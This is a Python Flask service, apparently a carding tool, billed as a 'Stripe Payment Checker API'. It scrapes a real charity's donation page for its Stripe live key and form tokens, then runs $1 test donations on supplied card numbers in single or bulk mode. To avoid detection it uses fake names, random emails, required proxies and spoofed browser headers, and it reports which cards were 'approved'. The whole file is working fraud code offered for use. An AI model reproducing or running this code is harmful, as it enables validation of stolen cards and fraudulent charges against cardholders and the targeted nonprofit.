from flask import Flask, request, jsonify
import requests
import re
import random
import time
from faker import Faker

app = Flask(__name__)

class PaymentProcessor:
    def __init__(self, proxy=None):
        self.r = requests.Session()
        self.fake = Faker()
        self.amount = '1.00'
        self.email = f"usera{random.randint(1000,9999)}@gmail.com"
        self.url = 'freedom-ride.org'
        self.payment_user_agent = 'stripe.js%2Fa28b4dac1e%3B+stripe-js-v3%2Fa28b4dac1e%3B+split-card-element'
        self.headers = {
            'authority': 'api.stripe.com',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        # إعداد البروكسي إذا كان موجوداً
        if proxy:
            self.proxies = {
                'http': proxy,
                'https': proxy
            }
        else:
            self.proxies = None

    def get_payment_data(self):
        try:
            r1 = self.r.get(f'https://www.{self.url}/donate/', 
                           headers=self.headers, 
                           proxies=self.proxies,
                           timeout=30).text
            self.pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', r1).group(1)
            self.acct = re.search(r'(acct_[A-Za-z0-9_-]+)', r1).group(1)
            self.givewp = re.search(r'name="give-form-id" value="(.*?)"', r1).group(1)
            self.givewp2 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1).group(1)
            self.givewp3 = re.search(r'name="give-form-hash" value="(.*?)"', r1).group(1)
            return True
        except Exception as e:
            return False

    def process_payment(self, card_data):
        try:
            n, mm, yy, cvc = card_data.split('|')
        except:
            return 'Error: Invalid card format. Use: number|mm|yy|cvc'

        try:
            # إنشاء طريقة الدفع
            data = f'type=card&billing_details[name]={self.fake.first_name()}+{self.fake.last_name()}&billing_details[email]={self.email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent={self.payment_user_agent}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={self.pk_live}&_stripe_account={self.acct}'
            
            r2 = self.r.post('https://api.stripe.com/v1/payment_methods', 
                           headers=self.headers, 
                           data=data,
                           proxies=self.proxies,
                           timeout=30)
            
            if r2.status_code != 200:
                return f'Error: Payment method creation failed - {r2.text}'
                
            payment_method_id = r2.json()['id']

            # إتمام عملية الدفع
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': self.givewp2,
                'give-form-id': self.givewp,
                'give-form-title': 'Freedom Funds',
                'give-current-url': f'https://www.{self.url}/donate/',
                'give-form-url': f'https://www.{self.url}/donate/',
                'give-form-minimum': self.amount,
                'give-form-maximum': '999999.99',
                'give-form-hash': self.givewp3,
                'give-price-id': 'custom',
                'give-amount': self.amount,
                'give_stripe_payment_method': payment_method_id,
                'payment-mode': 'stripe',
                'give_first': self.fake.first_name(),
                'give_last': self.fake.last_name(),
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': self.email,
                'give_comment': '',
                'card_name': self.fake.name(),
                'give_action': 'purchase',
                'give-gateway': 'stripe',
            }

            r3 = self.r.post(f'https://www.{self.url}/donate/', 
                           params={'payment-mode': 'stripe', 'form-id': self.givewp}, 
                           headers=self.headers, 
                           data=data,
                           proxies=self.proxies,
                           timeout=30)
            
            if 'Donation Confirmation' in r3.text:
                return 'CHARGE 1.00$'
            else:
                msg_match = re.search(r':\s*(.*?)<br>', r3.text)
                if msg_match:
                    return msg_match.group(1)
                else:
                    return 'Error: Payment failed - Unknown error'
                    
        except Exception as e:
            return f'Error: {str(e)}'

# الردود الأساسية مع معلومات المبرمج
def base_response(message, status="success"):
    return {
        "status": status,
        "message": message,
        "developer": "@NaN_xax",
        "channel": "https://t.me/+LPjSsuJXV7owMGVk",
        "timestamp": time.time()
    }

@app.route('/')
def home():
    return jsonify(base_response("Stripe Payment Checker API - Use /check endpoint with proxy"))

@app.route('/check', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify(base_response("Error: No JSON data provided", "error")), 400
        
        card = data.get('card')
        proxy = data.get('proxy')
        
        if not card:
            return jsonify(base_response("Error: Card data is required", "error")), 400
        
        if not proxy:
            return jsonify(base_response("Error: Proxy is required for security", "error")), 400
        
        # إنشاء معالج الدفع مع البروكسي
        processor = PaymentProcessor(proxy=proxy)
        
        # الحصول على بيانات الدفع
        if not processor.get_payment_data():
            return jsonify(base_response("Error: Failed to get payment data", "error")), 500
        
        # معالجة الدفع
        result = processor.process_payment(card)
        
        response_data = base_response(result)
        response_data["card"] = card
        response_data["amount"] = processor.amount
        
        if 'CHARGE' in result:
            response_data["status"] = "approved"
        elif 'Error' in result:
            response_data["status"] = "error"
        else:
            response_data["status"] = "declined"
        
        return jsonify(response_data)
        
    except Exception as e:
        error_response = base_response(f"Internal server error: {str(e)}", "error")
        return jsonify(error_response), 500

@app.route('/bulk-check', methods=['POST'])
def bulk_check():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify(base_response("Error: No JSON data provided", "error")), 400
        
        cards = data.get('cards', [])
        proxy = data.get('proxy')
        
        if not cards:
            return jsonify(base_response("Error: Cards array is required", "error")), 400
        
        if not proxy:
            return jsonify(base_response("Error: Proxy is required for security", "error")), 400
        
        if len(cards) > 50:
            return jsonify(base_response("Error: Maximum 50 cards per request", "error")), 400
        
        results = []
        processor = PaymentProcessor(proxy=proxy)
        
        # الحصول على بيانات الدفع مرة واحدة
        if not processor.get_payment_data():
            return jsonify(base_response("Error: Failed to get payment data", "error")), 500
        
        for card in cards:
            result = processor.process_payment(card)
            card_result = {
                "card": card,
                "result": result,
                "status": "approved" if 'CHARGE' in result else "declined"
            }
            results.append(card_result)
            time.sleep(2)  # تأخير بين الطلبات
        
        response_data = base_response("Bulk check completed")
        response_data["results"] = results
        response_data["total_cards"] = len(cards)
        response_data["approved_count"] = len([r for r in results if r["status"] == "approved"])
        
        return jsonify(response_data)
        
    except Exception as e:
        error_response = base_response(f"Internal server error: {str(e)}", "error")
        return jsonify(error_response), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
